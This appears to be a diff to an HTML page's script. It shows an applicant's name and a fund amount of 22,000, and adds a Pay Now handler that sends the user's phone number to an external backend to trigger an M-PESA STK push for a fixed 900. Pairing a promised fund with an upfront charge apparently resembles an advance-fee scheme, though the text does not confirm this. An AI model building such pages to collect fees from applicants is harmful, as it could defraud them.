@@ -96,12 +96,73 @@ Pay Now
 </div>
 
 <script>
+
+let applicant = localStorage.getItem("applicantName");
+
 document.getElementById("name").innerHTML =
-localStorage.getItem("applicantName") || "Applicant";
+applicant || "Applicant";
+
+document.getElementById("fullName").value =
+applicant || "";
 
 document.getElementById("fund").innerHTML =
 localStorage.getItem("selectedAmount") || "22,000";
-</script>
+
+async function payNow(){
+
+let phone = document.getElementById("phone").value;
+
+let btn = document.getElementById("payBtn");
+
+if(phone===""){
+alert("Enter phone number");
+return;
+}
+
+btn.innerHTML = "Sending STK Push...";
+btn.disabled = true;
+
+try{
+
+let response = await fetch(
+"https://swiftwallet-backend-k8kn.onrender.com/stk-push",
+{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body: JSON.stringify({
+phone: phone,
+amount: 900
+})
+}
+);
+
+let data = await response.json();
+
+console.log(data);
+
+btn.innerHTML = "Waiting for payment...";
+btn.disabled = true;
+
+document.getElementById("stkMessage").innerHTML =
+"STK Push sent. Enter your M-PESA PIN to complete payment.";
+
+}
+catch(error){
+
+console.log(error);
+
+alert("Payment request failed");
+
+btn.innerHTML = "Pay Now";
+btn.disabled = false;
+
+}
+
+}
+
+</script> 
 
 </body>
   </html>
